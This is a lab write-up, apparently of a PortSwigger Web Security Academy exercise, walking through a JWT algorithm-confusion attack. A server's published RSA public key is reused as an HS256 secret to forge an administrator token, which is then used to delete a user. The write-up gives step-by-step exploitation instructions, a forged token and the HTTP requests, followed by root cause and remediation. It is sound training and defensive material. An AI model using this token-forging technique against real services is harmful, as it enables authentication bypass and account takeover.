# JWT authentication bypass via algorithm confusion

**Category:** Broken Authentication (JWT)  
**Difficulty:** ⭐⭐ (Practitioner)  
**Severity:** 🔴 Critical  
**OWASP Top 10:** A07:2021 – Identification and Authentication Failures

---

## Description

This lab uses a JWT-based authentication mechanism where tokens are signed using the RS256 (asymmetric) algorithm. An algorithm confusion vulnerability arises because the server uses the same verification routine regardless of the `alg` header value. By switching the algorithm to HS256 (symmetric) and signing the token with the server's **public** key as the HMAC secret, an attacker can forge a valid token for any user — including the administrator — and gain full access to the admin interface.

---

## Discovery Process

### Step 1 — Login with the supplied credentials

Logged in to the application as the low-privileged user `wiener:peter`. This issues a session JWT that is sent with subsequent requests.

> 📸 `screenshots/01-login.png`

### Step 2 — Inspect the JWT and confirm the admin restriction

In Burp, the session token was decoded in the JSON Web Token tab. The header shows `"alg": "RS256"` with a `kid` of `974eae6d-6afe-4aae-a968-93b3f5283092`, and the payload contains `"sub": "wiener"`. Requesting `/admin` returns `HTTP/2 401 Unauthorized` with the message that the admin interface is only available to administrators.

> 📸 `screenshots/02-jwt-rs256-401.png`

### Step 3 — Obtain the server's public key from the JWK Set

Because the lab signs with RS256, the corresponding public key is exposed at the standard JWKS endpoint. Browsing to `/jwks.json` revealed the RSA public key (`kty: RSA`, `alg: RS256`) along with the matching `kid`, `n`, and `e` values. In algorithm confusion, this public key is the secret an attacker needs.

> 📸 `screenshots/03-jwks-json.png`

---

## Exploitation

### Step 4 — Import the JWK and convert it to PEM

Using the JWT Editor extension, a new RSA key was added by pasting the JWK from `/jwks.json`. The key was then viewed in PEM format to obtain the standard `-----BEGIN PUBLIC KEY-----` block.

> 📸 `screenshots/04-rsa-key-pem.png`

### Step 5 — Base64-encode the PEM public key

The exact PEM public key string (including header/footer lines and newline) was Base64-encoded (e.g. in Burp Decoder). This produces the byte-for-byte representation that will be reused as the symmetric HMAC secret.

> 📸 `screenshots/05-pem-base64-encoded.png`

### Step 6 — Create a symmetric (HMAC) key from the encoded public key

In JWT Editor a new Symmetric Key was generated, then its `k` value was replaced with the Base64-encoded PEM string from the previous step. The `kid` was kept matching the original key. This is the malicious oct key the server will inadvertently trust.

> 📸 `screenshots/06-symmetric-key.png`

### Step 7 — Forge an admin token signed with HS256

The request to `/admin` was sent to Repeater. In the JWT tab the header `alg` was changed from `RS256` to `HS256`, and the payload `sub` was changed from `wiener` to `administrator`. The token was then signed using the symmetric key created in Step 6 (with the "Don't modify header" option so the `alg` stays HS256).

**Request sent:**

```http
GET /admin HTTP/2
Host: 0a24009204d524be80d9356300530031.web-security-academy.net
Cookie: session=eyJraWQiOiI5NzRlYWU2ZC02YWZlLTRhYWUtYTk2OC05M2IzZjUyODMwOTIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MjU2MjEwNywic3ViIjoiYWRtaW5pc3RyYXRvciJ9._rqquB5aLmbFMHJe3t1zBf5fQGCK_9OUisKUKeo5N88
```

**Response received:**

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3259
```

The forged HS256 token (header `alg: HS256`, payload `sub: administrator`) was accepted and returned `200 OK`, exposing the admin panel.

> 📸 `screenshots/07-hs256-admin-200.png`

### Step 8 — Perform a privileged action (delete user)

With admin access confirmed, the admin function to delete the user `carlos` was invoked. The request `GET /admin/delete?username=carlos` was sent with the forged token and returned `HTTP/2 302 Found` redirecting to `/admin`, confirming the action succeeded.

**Request sent:**

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a24009204d524be80d9356300530031.web-security-academy.net
Cookie: session=eyJraWQiOiI5NzRlYWU2ZC02YWZlLTRhYWUtYTk2OC05M2IzZjUyODMwOTIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MjU2MjEwNywic3ViIjoiYWRtaW5pc3RyYXRvciJ9._rqquB5aLmbFMHJe3t1zBf5fQGCK_9OUisKUKeo5N88
```

**Response received:**

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

> 📸 `screenshots/08-delete-carlos-302.png`

### Step 9 — Lab solved

After deleting `carlos`, the lab status changed to **Solved** with the "Congratulations, you solved the lab!" banner.

> 📸 `screenshots/09-solved.png`

---

## Impact

- **Full authentication bypass** — An attacker can forge a token for any user without knowing any private signing key, defeating the entire authentication scheme.
- **Privilege escalation to administrator** — The `sub` claim can be set to `administrator`, granting access to functionality restricted to admins.
- **Account takeover and destructive actions** — Admin access allowed deletion of the user `carlos`; an attacker could delete, modify, or impersonate any account.
- **Trust in a public artifact** — The secret needed for the attack (the public key) is intentionally published at `/jwks.json`, so exploitation requires no privileged information.

---

## Root Cause

The vulnerability exists because the server's verification logic selects the cryptographic operation based on the attacker-controlled `alg` header instead of pinning the expected algorithm. The same public key is used both to verify RS256 signatures and, when `alg` is HS256, as the HMAC secret. Since the RSA public key is published in the JWK Set, the attacker possesses everything required to compute a valid HMAC signature.

**Vulnerable flow:**

```text
Attacker sets alg=HS256, signs with public key as HMAC secret
   → Server reads alg from header and runs HMAC verification with the public key
   → ❌ No check that alg matches the expected asymmetric algorithm → token accepted
```

**Secure flow:**

```text
Attacker sets alg=HS256, signs with public key as HMAC secret
   → Server ignores the token's alg and enforces the expected RS256 verification
   → ✅ HMAC-forged signature fails RSA verification → token rejected
```

---

## Remediation

- **Pin the verification algorithm** — Explicitly specify the allowed algorithm (e.g. RS256) on the server side and reject any token whose `alg` does not match, rather than trusting the header.
- **Use separate keys per algorithm class** — Never reuse an asymmetric public key as an HMAC secret; symmetric and asymmetric keys must be kept strictly distinct.
- **Reject untrusted `alg` values** — Disallow `none` and any unexpected algorithm; maintain a strict allow-list in the JWT library configuration.
- **Limit public key exposure where feasible** — Only publish keys that genuinely need to be public, and ensure the server treats the JWKS purely as verification material for the intended algorithm.

---

## Tools Used

- Burp Suite (Proxy, Repeater & Decoder)
- JWT Editor Extension

---

## References

- <https://portswigger.net/web-security/jwt/algorithm-confusion>
- <https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion>
- RFC 7519 – JSON Web Token (JWT)
- RFC 7517 – JSON Web Key (JWK)
- <https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/>
